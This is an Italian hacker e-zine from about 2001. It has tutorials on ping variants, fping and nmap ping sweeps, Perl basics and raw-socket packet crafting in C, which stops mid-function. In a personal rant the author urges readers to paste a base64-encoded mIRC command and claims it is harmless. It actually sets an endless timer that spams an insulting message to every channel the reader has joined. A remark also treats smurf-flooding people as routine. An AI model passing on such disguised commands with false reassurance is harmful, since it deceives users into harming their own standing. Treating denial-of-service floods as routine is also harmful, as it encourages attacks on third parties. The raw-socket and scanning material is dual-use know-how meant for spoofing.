Beh ora ke sapete pingare BENE, divertitevi un poketto, mentre io spiego altri users di linux.


------------------------------------------OpenSource LinuX-------------------------------------

Beh diciamo ke se non avete ping è grave ma lo potete trovare sikuramente nell'ultima release
su freshmeat.net. Aprite il terminale e scrivete ping

--------------------------------------------------------------------------
 root@advanced:~# ping
usage: ping [-LRdfnqrv] [-c count] [-i wait] [-l preload]
        [-p pattern] [-s packetsize] [-t ttl] [-I interface address] host
--------------------------------------------------------------------------

Beh qui ci sono le istruzioni del ping, ke sono più o meno simili a quelle di windows.... Cmq per
saperne di più digitate " man ping " e vi leggete il  manuale in inglese.
Ci sono però alkune sostanziali differenze da linux: una è ke di defoult fa infiniti ping all
host di destinazione, e per stopparlo bisogna premere ^z ( control + Z ). Un altra è ke la size
dei pakketti icmp è 56 invece ke 32. Il resto più o meno funziona alla stessa maniera...
Basta leggere qui sotto:

---------------------------------------------------------
root@advanced:~# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1): 56 octets data
64 octets from 127.0.0.1: icmp_seq=0 ttl=255 time=0.7 ms
64 octets from 127.0.0.1: icmp_seq=1 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=2 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=3 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=4 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=5 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=6 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=7 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=8 ttl=255 time=0.0 ms
64 octets from 127.0.0.1: icmp_seq=9 ttl=255 time=0.0 ms
[1]+  Stopped                 ping 127.0.0.1
root@advanced:~#
---------------------------------------------------------

Bene non credo ke debba dire altro sul funzionamento.... anzi invece sì avete fatto caso all'opzione
[-s packetsize] ? io si adesso:) bene, da Windows non si può sciegliere la size in bite del pakketto
icmp, mentre qui si per esempio:

root@advanced:~# ping -s 100 127.0.0.1

Manderà i pakketti da 100 byte invece ke il defoult:) . Beh diciamo ke questo ke abbiamo visto fino
adesso è solo uno dei modi di pare il Ping...Con l'opzione -c numeropakketti invece stabiliremo
quante rikieste di pign inviare.

Ora tenetevi  forte ke passiamo ad analizzare le cose serie, e più difficili.Mojodo RUlez

[4.4]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* T1p1 d1 PING * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Non esiste un solo tipo di ping come credete voi! NO no per niente :) Beh diciamo ke quello più
diffuso è quello ke abbiamo descritto fino adesso, ma ce ne sono molti altri utili. Questi non si
trovano su nessun altro documento, o per lo meno IO non ne ho trovati.Queste cose le ho imparate
Leggendo il mitiko libro dell apogeo " HAcker!Techniche e segreti per la sikurezza in ambiente
linux", ora sono ankora a metà, cmq vi diko ke è troPPo bellO compratevelo! io l'ho preso alla
smaU 2oo1.

[4.4.1] CtCp Ping  ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Beh questo non è un vero e proprio tipo di Ping, ma ho ritenuto giusto introdurlo ugualmente.
Diciamo ke serve in irc, per vedere il ritardo ke h una persona ( lag ), o per vedere se per kaso
è caduta dato ke non ci risponde + in query. Oppure ( quello ke io uso di più ) quando smurfiamo
qualkuno e vogliamo veder se ha avuto effetto! sahbhbhba ke lamah:) Cmq il Funzionamento base è
lo stesso

|---------|                                    |----------|                 |---------|
|ADvAnCed | ------/ctcp `aLe` ping---------->> |   Irc    | -----PING?--->> |  `aLe`  |
|         |                                    |  Server  |                 |         |
|---------| <<--[`aLe` PING reply]: 4secs----- |          | <<---PoNG!----- |---------|
                                               |----------|

Beh credo ke abbiate kapito il funzionamento... scrivendo nel mirc /ctcp ping <nickname>
noi mandiamo al server una rikiesta di pingare <nickname>, in questo caso `aLe`. Il server
esegue il ping su `aLe`, ale risponde, il server elabora la risposta e ce la invia.Il nostro
client calcola il tempo traskorso da quando inviamo la rikiesta di ctcp ping, a quando riceviamo
una risposta e ce lo comunica. Quello è il lag.Se è superiore a 200 il server ci diskonnette.
Facciamo ora una esempio pratico: scriviamo nello status

--------------------------

/ctcp `aLe` ping

-

-> [`aLe`] PING

-

[`aLe` PING reply]: 4secs

--------------------------

Semplice no? Ora sappiamo ke 	`aLe` ha 4 secondi di lag... non è ottimo ma va bene.
Ma magari a voi potrebbe non andarvi bene il fatto ke la gente vi pinghi,perkè vi da fastidio,
potete benissimo da vostro mirc cambiare la ctcp reply! Beh per fare sta cosa è rikiesta una
minima conoscenza di mirc scripting...Anzi no va beh è lostesso ve lo faccio io il code... :)
Bhe aprite il vostro mIRC, li vedete tutti quei bottoni in alto? ce ne stanno una serie di 3,
alias, popups, e remote ( se non li vedete andate in tools-->>remote ) e aprite remote.
Ekko ora siamo dentor il cuore del mIRClo sentite ke batte? :))) Ora andate in fonfo alla pagina
e copiateci il seguente code:

CTCP ^*:PING:*: { .ctcpreply $nick PING Ping -1 sec | haltdef }

Semplice no..... La risposta qui la potete cambiare a piacere, sostituendo con il testo ke volete
" - 1 sec " per esempio...


CTCP ^*:PING:*: { .ctcpreply $nick PING Ping Vuoi giokare a Ping-POng? | haltdef }

Capito il gioketto? Kosì potete fregare i LamroZZoli ke non si fanno i kazzi loro... Proviamo ora
a pingarci da soli dal mIRC:
---------------------------------------------------

/ctcp `advanced` ping
-
-> [`advanced`] PING
-

[`ADvAnCeD` PING reply]: Vuoi giokare a ping pong?
--------------------------------------------------
Adesso divertitevi a cambiare a piancere il ctcp reply. Ora gli uTONTI di windows possono anke
non leggere perkè la parte successiva è dedicada escclusivamente al pinGuInoZZo



[4.4.2] Icmp Ping  ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Sapete cos'è l'icmp ping? come noooooooooooooo???????????????? è dall'inizio di questo documento
ke ne sto parlando ;) L'icmp ping è quello base, il più semplice, quello ke abbiamo fatto finora.
Passiamo ora a vedere altri 3 tipi!



[4.4.3] Echo Ping  ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Un altro tipo di ping, sebbene il termine non sia completamente accurato, può essere ottenuto
inviando alla porta echo ( 7 ) di un sistema pakketti udp o tcp. Qualunkua siano i dati inviati
a questa porta, saranno restituiti trmaite echo.Pertanto, se si riceve la risposta attesa, si
può supporre ke il sistema sia attivo e funzionante, e valutanto la velocitò di risposta, anke
il suo lag: Per esempio
----------------------------------------------
advancedbox$ telnet 127.0.0.1 7
Connected to LocalHost.
Escape character is '^]'
Proviamo a vedere se rispondi a questo testo
Proviamo a vedere se rispondi a questo testo
----------------------------------------------
Funziona!




[4.4.4] Fping      ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


Fping è un'utility di ping semplice. Invece di inviare un pakketto ICMP e rimanere in attesa di
una risposta, il comando Fping invia molti pakketti in parallelo ed elabora le risposte kuando
le riceve.La generazione di comandi massicci di ping, pertanto, è molto più veloce rispetto all'
esecuzione in sequenza di rikieste distinte. E` ossibile elencare esplicitamente i sistemi o gli
 indirizzi ip di cui si desidera effettuare il ping nella riga di comnado, o si può fornire l'
elenco al comando con lo standard input.Se si dispone,per esempio, di un elenco di sistemi a cui
inviare il ping nel file "machinelist", il comando potrà essere il seguente:

advancedbox$ fping -a < machinelist

Se si desidera effettuare la scansione di reti complete(per esempio la rete 192.168.10.*), si
dovrà fornire l'elenco completo di di indirizzi ip. Usando perl dalla riga di comando, la
scansione può essere eseguita facilmente nel modo ke segue:

advancedbox$ perl -e 'for (1...254) { print "192.168.10.$_\n"} ' | \ fping -a -q 2>/dev/null

=) studiatevi il perl da mojodo.cjb.net



[4.4.5] Ping Sweep Con Nmap ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


Nmap, dispone di una funzionalità integrativa di ping sweep.E` sufficente fornire un elenco di
indirizzi o di rete e usare l'opzione -sP:

------------------------------------------------------------------------------------
advancedbox$ Nmap -sP 192.168.10.0/24
Starting Nmap V. 2.54BETA7 (www.insecure.org/nmap)
Host ( 92.168.10.0 ) seems to be a subnet bradcast address ( returned 3 extra plug )
Host kristen (92.168.10.6) appears to be up
Host richard (92.168.10.10) appears to be up
Host brady (92.168.10.15) appears to be up
Host Advanced (92.168.10.18) appears to be up
Nmap run completed -- 256 ip address (4 host up) scanned in 154 seconds
------------------------------------------------------------------------------------

La definizione di ping di Nmap,quando si usa l'opzione -sP è,in effetti,un po' più ampia rispetto
al comando icmp.Invierà sia un normale pakketto di echo icmp sia un pakketto tcp ACK alla porta
80(http) del sistema.Anke se ICMP è blokkato, il protocollo TCP generalmente potrà passare. Se
Nmap riceve un pakketto RST (reset) dall host in risposta al comando ACK, si potrà così
determinare ke il sistema è in funzione. Nell esempio precedente abbiamo usato la notazione
92.168.10.0/24 per definire gli host di cui effettuare la scansione.Questo signifika scansionare
tutti i sistemi della rete con una subnet mask a 24 bit( ovvero la rete di classe c).Nmap può
supportare diversi metodi per la definizione degli host
|------------------------------------------------------------|
|Tipo          |                Esempio                      |
|------------------------------------------------------------|
|Wildcards     |      192.168.10.*       10.10.*.*           |
|Rangers       |   192.168.10.0-255      10.10.0-255.0-255   |
|CIDR notattion|            192.168.10.0/24                  |
|------------------------------------------------------------|

-------------------
Ok ora abbiamo "finito" di parlare del ping in se... Spero di essere stato kiaro... Passiamo
ora a vedere come proteggersi dai MassPing


[4.5]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* SmUrf1nG * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Uhm raga in questo periodo sono veramente inkasinato, e questa parte dei DoS è molto lunga da
spiegare, e sinceramente ora non ho tempo, quindi ho deciso di pubblicare in seguito un bell'
articolone sullo smurfing. Kiedo skusa ai lamah se avevano fretta. :) Lo troverete sikuramente
all'url http://mojodo.cjb.net


[5]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* Sf0g0 * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Non lo so perkè ho fatto questa cosa. Sfogo? ke kos'è?? Non lo so nemmeno io.. è una parte di
questo vuoto skermo bianko dove io posso scrivere le kose ke mi frullano per la testa ( (|) ).
Boh oggi sono tornato da skuola...  ke merda non ce la faccio più!!!! Inanzitutto pubblcizzo
ankora la NeoNata crew Mojodo di cui faccio parte! grazie mille a tutti. Stiamo andando avanti
molto bene, pubblicando molti testi, lezioni di linguaggi di programmazione programmi ecc...!
Una particolare nota va a XaNtHic` ke non dorme la notte e scrive 4 articoli a settimana!
ahbssausahuhsa è matto:) :) Saluto anke netdigger, ke adesso si starà divertendo  al meet a
napoli con altri miei amici.... Io come kazo ci vado a napoli da solo??? uFf SBoFF:) divertitevi.
Un saluto a fede ke riesce a connettere 500 cloni :))). Provate  a scrivere in un canale, con
il vostro mirc

//$decode(L3RpbWVyIDAgMCAvYW1zZyBTb25vIGdheSE=,m)

Tranquilli non è dannoso, l'ho fatto milioni di volte:) è divertente però :)  AH... ormai mi sa
ke sono diventato elettronikoDipendente...drogato di informatica... non sono più io appassionato
di computer, ma sembra ke il computer si sia appassionato di me e non mi lasci più andare, nelle
ore di skuola, la sera, con gli amici.... Quando apro la porta di casa la mia mano viaggia verso
il tasto power del pc, e io non posso fermarla... nemmeno saluto mamma, e infatti ci litigo
spesso! skusami mamma hai ragione lo so, ma non so come fare a smettere! A me sinceramente mi
piace vivere come sto vivendo adesso: non sono il tipo ke non esce mai e ke sta sempre qui,
anke se non ho nulla in contrario! Io esco spesso, molto spesso, anke troppo ( 12.000 km col
motorino in 10 mesi SUHAUHSAUH ), ma quando sono a kasa, non faccio altro ke stare al computer.
Non studio, non guardo la tv, non leggo, non parlo con i miei.... Niente. Solo pc. Ogni giorno
imparo un sakko di cose nuove e sono contentissimo, ma la sera quando vado a letto, non penso
come le persone "normali" ai compiti per il giorno dopo!! Penso a cosa fare la mattina successiva
quando accenderò il pc ( uppare il sito, leggere il doc, provare sto programma, fare un txt,...).
A skuola ora fanno le olimpiadi di inormaatica ke riguardano ilc, c++ e il pascal. Dato ke so
molto poko di tutti e 3, me ne resto buono al mio posto tanto no ho bisogno di dimostrare a
nessuno al di fuori di me stesso, quello ke so fare :)
Per me il pc è,oltre una pozzo senza fondo di figate ke voglio scoprire TUTTE, è un modo per
conoscere nuova gente, nuove persone, da ogni parte di italia o del mondo, con idee spesso diverse
dalle mie!Non è possibile parlare con 30 persone da ogni parte di italia fuori dal pc, è per questo
ke io spesso mi confronto con altra gente da ogni zona!Non vi so spiegare il concetto ma tutto
ciò a mio parere è veramente stupendo... In chat sei libero di esprimerti, urlare, sfogarti.
Nessuno può farti niente al di fuori di bananrti. In chat liberi il tuo vero ego, non esiste
pudore, vergogna o paura. Questi sentimenti stanno fuori. Sei liberoliberoliberoliberolibero
liberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoli
liberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoli
liberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoliberoli
Sei libero di pensare , di parlare, di dire , di esprimerti e questo è stupendo. Io so ke quando
lascio i miei amici della piazzetta, e me ne torno a casa, so ke qui, dentro a questo 17''
ce ne sono altri 2873829238 milioni ke mi aspettano con cui possono parlare. Io odio la solitudine.
Non riesko a stare, come molti fanno, fermo davanti al televisore, o su un libro. IO voglio
interagire con la mia vita, non farmela passare davanti. L'importante è ke non passi TUTTA davanti
al monitor. Ma perkè ora ke fuori è bello e sono le 5 quasi, stop scrivendo ste cose ke voi non
leggerete?? Boh! non ne ho idea:) volevo solo far sapere ciò ke penso. A dimentikavo! questa
ultima parte del txt l'ho scritta col blocco note ( e col cuore) di windowsXP ke mi sono installato
stanotte!!!!!!!!!! Molto carino a livello grafiko! dai in 9 ore ho dovuto fare control alt canc
solo 4 volte senza mai spegnerlo! Facciamo progressi zio Billy era ora!!! Ha anke una gestione
 utenti grafika favolosa!!! finalmente mia madre non leggerà le mie cose, non runnerà i miei
programmi, non mi disinstallerà roba a kaso come faceva prima :)Ora posso tenere tutte le
immagini porno ke mi pare senza ke lei possa accedere alla cartella!uhshuauhasuhsa.
Gli ho creato un account "mamma" ke ha meno privilegi di un guest su ftp :) Può solo usare office!
Dai mi piace xp, ma SlackWAre rimane sempre SLaK:) Ok finito con le riflessioni e con le stronzate.
Anzi NO! Una sera mio papo mi fa:

-" Ma ke kazzo hai fatto ieri connesso in..in... quella.. Chat,studia di più come fanno tutti. Non sei normale. "

-" Hem papa te non puoi immaginare nemmeno cosa faccio col pc, se sto in chat è per parlare e
   discutere con gente ke mi può aiutare....Quando io mi connetto la notte ci sono sempre minimo
   30 ragazzi come me con cui diskuto e parliamo di cose serie! "

-" Ma tu devi studiare di più invece di dire parlare in chat, esci vai a farti una corse...La sera
   le persone normali dormono. Non eisste ke te ti connetti per parlare con 30 idioti mente gli
   gli altri milioni di ragazzi dormono"

-" PAPA` , TU FORSE NON LO SAI, MA SE NON CI FOSSERO QUERI RAGAZZI, PROGRAMMATORI, E AMICI KE LA NOTTE
   RINUNCIANO A DORMIRE PER STARE CON IL PC, FORSE IL MONDO DELLA TECNOLOGIA NON SAREBBE COSI AVANZATO
   E DIFFUSO COME LO E` ADESSO . E poi tutte le altre persone ke tu definisci "normali" sono solo
   degli ignoranti, ke non sanno kosa si naskonde dietro a quello ke fanno, e sono sikuro ke se sapessero
   ke mondo fantastiko si nasconde la dietro, starebbero tutti "in chat a dire kazzate".. come hai detto te!!!!

YASGYSAGYSASA ;) è rimasto zitto poi :) Boh spero ke condividiate! Alla prossima ragazzi! aLe ti aM.....mazzO!


[6]»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»* 3nD * »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

Beh sono giunto alla fine. Spero di essere stato kiaro... per più informazioni o/e kiarimenti,
advanced@mojodo.cjb.net . Bestemmie, insulti e complimenti sono sempre bene accetti.
Miraccomando fatevi sentire e studiate...... studiateeeeeeee leggete più doc possibili.


----------------------------------------
[Kvirc status]

/quit Plaing "vita 2001" beta November

***Disconnected
----------------------------------------

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

------------------------------------*END*--------------------------------------

================================================================================
--------------------------------------------------------------------------------
------------------------------[Programmazione]----------------------------------
--------------------------------------------------------------------------------
================================================================================

------------------------------------[17]---------------------------------------
----------------------------[ [](LoRd[V]icio)[] ]------------------------------
---------------------------------[Perl #1]-------------------------------------


PREMESSA

Dopo innumerevoli testi scritti x newbies,ho deciso di scrivere un tutorial ke
trattase (anke se in linea generali) un pò di programmazione ...
L'argomento del tutorial sarà il PERL


                                       INIZIAMO
--------------------------------------------------------------------------------

Il perl è un linguaggio di programmazione orientato x il web .... in pratica sarete
in grado di farvi i vostri programmini CGI da inserire nei vistri siti ... ma
potete anke usarlo x scrivere altri tipi di programmi x la gestione del vostro o.s .

Come prima cosa andremo a scaricare dalla rete un interprete perl .. lo troveremo
in tutte le salse (sorgente,precompilato) x tutti o.s ...
Fatevi una navigata su www.perl.com o .org

---------------------------------------------------------------------------------

Iniziamo un pò di programmazione ...... (piattaforma win32)

X scrivere il vostro primo programma basta un semplie editor dal Blocconote all'edit
in dos.
Digitare le seguenti stringhe:


#!C:/perl/bin/perl.exe
print "NoFlyZone Crew  \n";
print "Io sono lordvicio\n";
print "spero di essere abbastanza chiaro\n";


Analizziamo le varie strighe:

#!C:/perl/bin/perl.exe ----> Qua indichiamo il percorso dell'interprete
print "NoFlyZone Crew  \n"; ----> il comando print ordina di stampare ciò che è
contenuto tra i "" , \n ordina il programma ad andare a capo , ; chiude il prog.

Una volta editato , nn resta che salvare il file con estensione .pl .. in una
cartella . IMPORTANTE: assicurarsi che il vostro sistema riconosca la nuova
estensione .pl

Nn resta ke provare il programma ... se fate doppio click si aprirà un finestra
dos ...ma nn farete in tempo e leggere il prog .. xkè dato che nn avrete commesso
errori , il prog si arresterà e chiudendosi automaticamente :)

Quindi potrete benissimo andare in c:\perl\bin e dare il seguente comando
perl c:\fatevoi:)\nnsaprei:).pl ..... questo sarà il risultato !

NoFlyZone Crew
Io sono lordvicio
spero di essere abbastanza chiaro

---------------------------------------------------------------------------------

Adesso complichiamoci il tutto con l'introduzione delle "Variabili scalari"

Editate il solito file.pl

$a = 'NoFlyZone Crew';
$b = 'io sono lordvicio';
$c = 'spero di essere abbastanza chiaro';

print "$a \n";
print "$b \n";
print "$c \n";


Scommetto ke avete già capito tutto ma x i meno furbi vi spiego tutto x bene :)

Come avete notato abbiamo usato tre Variabili scalari $a, $b e $c , contenenti
semplici strighe di testo.Queste variabili si possono define come locazioni di
memoria richiamabili per mezzo del loro nome e possono contenere sia un numero,
un carattere o un stringa. Perl distingue solamente due tipi di variabili ...
Variabili scalari e e variabili lista contenente, in qualsiasi ordine, un insieme
di valori.

---------------------------------------------------------------------------------

Avviate il vostro editor di testi ed aprite il file.pl

$denaro = '0.00';
print "Apprendere da questo tutorial ti è costato solo $denaro \$ \n";


----------------------------------------------------------------------------------

Ora cerchiamo di ripassare il tutto ....

Rieditate il vistro file.pl :)))

$a = 'NoFlyZone Crew';
$b = 'io sono lordvicio';
$c = 'spero di essere abbastanza chiaro';
$denaro = '0.00';

print "$a \n";
print "$b \n";
print "$c \n";
print "Apprendere da questo tutorial ti è costato solo $denaro \$ \n";


-------------------------------------------------------------------------------

Fino a qui spero sia stato tutto chiaro ....
Avete visto che il perl nn è confusionario e difficili come altri linguaggi ??? :))
Certo poi spiegato da me risulta ancora + facile ;)

Ora vi elenco i vari Costruttori :


\n     Newline
\r     Return
\t     Tab
\f     Formfeed
\b     Backspace
\a     Bell (beep)
\e     Escape
\007   Ottale ASCII (007 è Bell)
\x8a   Esadecimale ASCII
\cM    Carattere di controllo (CTRL-M)
\\     Backslash
\"     Doppio apice
\l     Prossima lettera minuscola
\L     Tutte le nuove lettere in minuscolo fino a \E
\u     Prossima lettera maiuscola
\U     Tutte le nuove lettere in maiuscole fino a \E
\Q     Preponi Backslash a caratteri non alfanumerici  fino a \E
\E     Termina il comando di \L, \U e \Q


-------------------------------------------------------------------------------


Qua finisce la prima parte del tutorial a questo straordinario linguaggio,a breve
inizierò la seconda con le definizioni,usi e particolarità  dei : numeri,strighe
e undef.Studieremo anke le "parentesi angolari" che vi permetteranno di programmare
il vostro primo script in grado di poter interagire con il suo esecutore.


Un salutone alla splendida NoFlyZone Crew che sta svolgendo un ottimo lavoro
www.noflyzone-crew.cjb.net

X qualsiasi chiarimento basta mandarmi un e-mail o venirmi a trovare in irc
irc.azzurra.org #NoFlyZone ---- > my nick : []LoRd[V]icio[]



               _________________________________________
              [                                         ]
              [            Copyright (C) 2001           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]
              [________________________________________ ]


------------------------------------*END*--------------------------------------

------------------------------------[18]---------------------------------------
--------------------------------[CityHunter]-----------------------------------
--------------------------------[Raw Socket]-----------------------------------


Eccoci di nuovo qui! Questa volta parleremo abbastanza nel dettaglio di Raw
socket. Cosa sono i raw socket? E' quella parte della programmazione dei socket
che ha in se un qualcosa di mistico e di affascinante...immaginate di poter
creare i vostri pacchetti da soli e spedirli nella rete!Non è una figata?:-)
Per cui partiamo subito! Vi raccomando di studiare bene questa parte se volete
poi capire qualcosa dei vari programmi che vi mostrerò in seguito sullo spoofing.
Darò cmq per scontato alcune parti inerenti alla teoria del TCP che trovate
nei primi due tutorial scritti da me e per l'ICMP quello scritto da [V]lad.
Premetto che non mostrerò quasi nulla di nuovo, quindi non rompetemi le palle
dicendomi che ho rippato o cagate varie,ok?:-)
Ultima cosa...visto lo scarso tempo a mia disposizione questo capitolo si dividerà
in due parti questa (theory) e una seconda (Implementation) in cui mostrerò dei
miei programmi e in cui spiegerò il codice in C. Quindi, se già non lo sapete,
nel frattempo studiatevelo per bene!
Iniziamo!

Prima che mi dimentichi...l'O.S. a cui farò riferimento è linux e simili...mi
pare che solo con WinXP potete programmare i Raw sotto winzoz! Ora iniziamo davvero!

----[Disclaimer]----

Questo documento è stato sviluppato solo per scopo educativo, per
aiutare a capire le reti, ed aiutare i sysadmin a difendersi da eventuali
attacchi descritti in questo documento. Di conseguenza l'autore del
testo non si assume nessuna responsabilità su ciò che venga fatto
tramite queste informazioni, e non ne incita l'utilizzo per scopi fraudolenti.

----[Intro]----

Ok. In tante occasioni in futuro dovremo saper modificare, sniffare, spoofare i nostri
pacchetti.Cosa usare? Qui entrano in gioco i RAW SOCKET. Per chi non lo sapesse RAW
significa "grezzo", in quanto saremo noi stessi a creare tutti, o quasi, i campi necessari
alla creazione del pacchetto che intendiamo spedire.
Dovremo quindi creare il nostro bel socket (esattamente come ho mostrato nell'articolo
precedente) e scrivere:

...
int fd;
fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

a cui dovremo poi fare seguire la chiamata all'opzione IP_HDRINCL che ci servirà per
poter pacioccare l'header IP del nostro datagramma! Quindi scriveremo:

setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));

con option =1.
Personalmente ora preferisco usare questo sistema per il completamento dei campi degli
header: definire un buffer al quale poi apponiamo dei puntatori a strutture che
definiscono gli header dei protocolli che intendiamo usare. Userò quindi una cosa simile:

char buffer[1500];
struct tcphdr *ntcp;
struct iphdr *nip;
ip = (struct iphdr *) (buffer);
tcp = (struct tcphdr *) (buffer+20);

A cui in certi casi dovremo aggiungere altri byte ai 20 se non vogliamo sovrapporre
gli ultimi dati dell'header TCP a quelli dell' IP!
Possiamo così completare il tutto con i nostri bei puntatori, così:

ip->ttl =255;
ip->daddr =inet_addr("127.0.0.1"); (per esempio)
ip->saddr =inet_addr("127.0.0.1");
tcp->source =htons(6969);
tcp->dest =htons(23);
ecc...

e poi usare la funzione sendto() per inviare il nostro buffer.
Sarà cmq tutto più chiaro con gli esempi pratici del prox articolo!

----[IP Header Struct]----

Ora andiamo sotto usr/include/netinet e vediamo cosa c'è di bello:

struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;
    /*The options start here. */
  };

Cosa c'è qui di interessante? Beh...per il problema del Byte Order vi rimando
a un altro mio tut sui socket dove è già tutto bello spiegato!
Gli altri campi dovrebbero già esservi chiari, ma ve li ripasso molto velocemente!

Version: beh...per ancora qualche tempo sarà 4:-))

IHL: sta per Internet Header Lenght...direi chiaro(preciso che è in 32 bit)

TOS: Type of service. Non ci importa più di tanto,vedetevi le RFC;-)

Tot_Len: campo che specifica la lunghezza totale del datagramma, header + data.

Id: è usato per identificare il frammento. Mi sembra ovvio che questo campo è
    usato solo quando i pacchetti sono frammentati.

Fragment Offset: qui il primo datagramma ha offset 0 e l'ultimo avrà valore
		 uguale al tot_len.

Ttl: quanti hop il pacchetto può fare prima che venga scartato e mandi un ICMP
     time exceed. Viene decrementato ad ogni hop di 1.

Check: header checksum utilizzato per verificare l'integrità del datagramma.

Saddr: il source address(IP).

Daddr: il destination address.

Ok...e con questo abbiamo visto i campi di una struttura IP.
Il nostro compito qual è? Semplice...scrivere un nostro pacchetto e mandarlo in
rete! Dobbiamo quindi usare una struttura simile e completare i vari campi che
ho elencato sopra.
Pronti?

/* IP header */

struct iphdr *ip;

ip->ihl		=5;
ip->version	=4;
ip->tos		=0;
ip->tot_len	=sizeof(struct iphdr) + 452;
ip->id 		=htons(getuid());
ip->ttl		=255;
ip->protocol	=IPPROTO_TCP;
ip->saddr	=inet_addr("127.0.0.1");
ip->daddr	=inet_addr("127.0.0.2");
ip->check	=in_cksum((unsigned short *)ip, sizeof(struct iphdr));

/* EOF */

eccolo qua bello pronto! Facile vero?:-)non mi sembra ci sia molto da spiegare!
I campi sono completati da un puntatore alla struttura ->.

----[TCP Header]----

Passiamo a vedere quello del TCP:


struct tcphdr
  {
    u_int16_t source;
    u_int16_t dest;
    u_int32_t seq;
    u_int32_t ack_seq;
#  if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int16_t res1:4;
    u_int16_t doff:4;
    u_int16_t fin:1;
    u_int16_t syn:1;
    u_int16_t rst:1;
    u_int16_t psh:1;
    u_int16_t ack:1;
    u_int16_t urg:1;
    u_int16_t res2:2;
#  elif __BYTE_ORDER == __BIG_ENDIAN
    u_int16_t doff:4;
    u_int16_t res1:4;
    u_int16_t res2:2;
    u_int16_t urg:1;
    u_int16_t ack:1;
    u_int16_t psh:1;
    u_int16_t rst:1;
    u_int16_t syn:1;
    u_int16_t fin:1;
#  else
#   error "Adjust your <bits/endian.h> defines"
#  endif
    u_int16_t window;
    u_int16_t check;
    u_int16_t urg_ptr;
};




Qui i campi non ve li descrivo...guardatevi i vecchi tut o le RFC.
Passiamo quindi a costruire il pacchetto:

/* TCP */

struct tcphdr *tcp;
struct pseudohdr *pseudo;

pseudo->saddr	=inet_addr("127.0.0.1");
pseudo->daddr	=inet_addr("127.0.0.1");
pseudo->useless	=0;
pseudo->protocol=IPPROTO_TCP;
pseudo->lenght	=htons(TCPHDR);

tcp->source	=htons(6969);		/* source port */
tcp->dest	=htons(23);		/* dest port */
tcp->seq	=htonl(123456);		/* ISN */
tcp->ack_seq	=htonl(0);
tcp->doff	=5;			/* valore di default */
tcp->fin	=0;
tcp->syn	=1;
tcp->rst	=1;
tcp->psh	=0;
tcp->ack	=0;
tcp->urg	=0;
tcp->window	=htons(4000);	/* massima grandezza del segmento successivo*/
tcp->urg_ptr	=htons(0);

tcp->check	=in_cksum((unsigned short *)pseudo,TCPHDR+PSEUDOHDR);

/* EOF */

Chiaro che prima di questo occorre definire una struttura pseudohdr.
Vediamo uno possibile:

struct pseudohdr {
		unsigned long saddr;
		unsigned long daddr;
		char useless;
		unsigned char protocol;
		unsigned short lenght;
		}


----[ Calcolo del Checksum]----

Per il calcolo del checksum usiamo l'algoritmo e il codice rippato dal ping:-)

u_short in_chksum(u_short *ptr, int nbytes)
{
  register long           sum;            /* assumes long == 32 bits */
  u_short                 oddbyte;
  register u_short        answer;         /* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

	/* mop up an odd byte, if necessary */
  if (nbytes == 1)
  {
    oddbyte = 0;            /* make sure top half is zero */
    *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
    sum += oddbyte;
  }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
